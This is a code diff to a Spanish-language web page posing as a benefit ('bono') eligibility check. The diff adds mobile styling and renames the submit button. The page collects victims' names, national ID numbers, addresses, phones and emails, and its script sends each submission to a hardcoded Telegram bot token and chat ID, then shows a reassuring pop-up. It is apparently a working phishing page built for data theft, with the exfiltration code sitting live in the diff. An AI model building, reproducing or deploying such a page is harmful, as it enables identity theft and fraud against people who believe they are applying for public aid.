@@ -121,6 +121,47 @@
     text-align: center;
   }
 
+  /* Ajustes para móviles */
+  @media (max-width: 480px) {
+    body {
+      padding: 10px;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 100%;
+      padding: 15px;
+    }
+
+    h1 {
+      font-size: 16px;
+      margin-bottom: 12px;
+    }
+
+    label {
+      font-size: 13px;
+      margin-bottom: 4px;
+    }
+
+    input[type="text"], 
+    input[type="tel"], 
+    input[type="email"] {
+      font-size: 14px;
+      padding: 8px 10px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      font-size: 14px;
+      padding: 10px 0;
+    }
+
+    .legal {
+      font-size: 10px;
+      margin-top: 10px;
+    }
+  }
+
   /* Estilo del pop-up */
   .popup {
     position: fixed;
@@ -134,18 +175,18 @@
 
   .popup-content {
     background: white;
-    padding: 25px 30px;
-    border-radius: 15px;
+    padding: 20px 25px;
+    border-radius: 12px;
     width: 90%;
-    max-width: 380px;
+    max-width: 360px;
     text-align: center;
-    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
   }
 
   .popup-content h2 {
     font-size: 18px;
     color: #0b44a4;
-    margin-bottom: 12px;
+    margin-bottom: 10px;
   }
 
   .popup-content p {
@@ -189,7 +230,7 @@
       Tus datos están protegidos.
     </div>
 
-    <button type="submit">Consultar</button>
+    <button type="submit">Verificar y Registrar</button>
   </form>
 
   <div class="legal">
@@ -201,19 +242,19 @@
 <div class="popup" id="popup">
   <div class="popup-content">
     <h2>Consulta enviada</h2>
-    <p id="popupMessage">En caso de aprobarse el bono, será comunicado inmediatamente al número de contacto o Gmail. Gracias.</p>
+    <p>En caso de aprobarse el bono, será comunicado inmediatamente al número de contacto o Gmail. Gracias.</p>
   </div>
 </div>
 
 <script>
-  const BOT_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
-  const CHAT_ID = "5654253897";
-
   const form = document.getElementById('bonoForm');
   const popup = document.getElementById('popup');
-  const popupMessage = document.getElementById('popupMessage');
 
-  form.addEventListener('submit', async function(e) {
+  // Poner aquí tus datos de Telegram
+  const TELEGRAM_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
+  const CHAT_ID = "5654253897";
+
+  form.addEventListener('submit', function(e) {
     e.preventDefault();
 
     const nombre = document.getElementById('nombre').value;
@@ -223,40 +264,34 @@
     const telefono = document.getElementById('telefono').value;
     const email = document.getElementById('email').value;
 
-    const message = `
-📄 *Nuevo registro*
-👤 Nombre: ${nombre}
-🆔 Cédula: ${cedula}
-🏙 Provincia/Ciudad: ${provincia}
-🏠 Dirección: ${direccion}
-📞 Teléfono: ${telefono}
-📧 Email: ${email}
+    const mensaje = `
+ *Nueva Consulta * 
+ Nombre: ${nombre}
+ Cédula: ${cedula}
+ Provincia/Ciudad: ${provincia}
+ Dirección: ${direccion}
+ Teléfono: ${telefono}
+ Email: ${email}
     `;
 
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      });
-
-      popupMessage.textContent = "En caso de aprobarse, será comunicado inmediatamente.";
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: "Markdown"
+      })
+    }).then(() => {
       popup.style.display = 'flex';
-      setTimeout(() => { popup.style.display = 'none'; form.reset(); }, 5000);
-
-    } catch(err) {
-      popupMessage.textContent = "Error al enviar la consulta. Inténtelo de nuevo.";
-      popup.style.display = 'flex';
-      setTimeout(() => { popup.style.display = 'none'; }, 5000);
-    }
+      setTimeout(() => { popup.style.display = 'none'; form.reset(); }, 3000);
+    }).catch(err => {
+      alert("Error al enviar a Telegram: " + err);
+    });
   });
 
   popup.addEventListener('click', function(e) {
-    if(e.target === popup) popup.style.display = 'none';
+    if (e.target === popup) popup.style.display = 'none';
   });
 </script>
 
